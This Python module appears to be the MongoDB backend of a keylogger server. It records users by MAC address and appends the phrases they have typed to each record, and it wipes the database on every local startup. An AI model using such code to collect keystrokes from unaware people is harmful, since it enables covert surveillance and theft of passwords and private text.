import os
from pymongo import MongoClient
from server import secrets
from server import logger

db = None

def setup_database():
    global db

    MONGO_URL = secrets.get_database_credentials()
    if MONGO_URL and False:
        # Heroku
        client = MongoClient(MONGO_URL)
    else:
        # Local (Development)
        client = MongoClient()
        client.drop_database('keylogger')
        logger.info("* Using LOCAL database")

    db = client['keylogger']


def get_user_id(user_dict):
    return db.users.find_one({"mac": user_dict["mac"]})


def get_or_create_user(user):
    user_dict = user.__dict__
    if get_user_id(user_dict) is None:
        user_dict['phrases'] = []
        db.users.insert_one(user_dict)
    return get_user_id(user_dict)


def insert_phrases(user, phrases_list):
    if get_user_id(user.__dict__) is None:
        logger.error("insert_phrases: Bad user id")
        return None
    # User has updated tags, so add phrases that the user has typed
    user_id = get_user_id(user.__dict__)
    user_id['tags'] += user.tags
    user_id['tags'] = list(set(user_id['tags']))
    for p in phrases_list:
        phrase = p.__dict__
        user_id['phrases'].append(phrase)
    # Update both the tags and the phrases
    update_user(user_id)

def update_user(user_dict):
    db.users.update({"mac": user_dict['mac']}, {"$set": user_dict}, upsert=False)
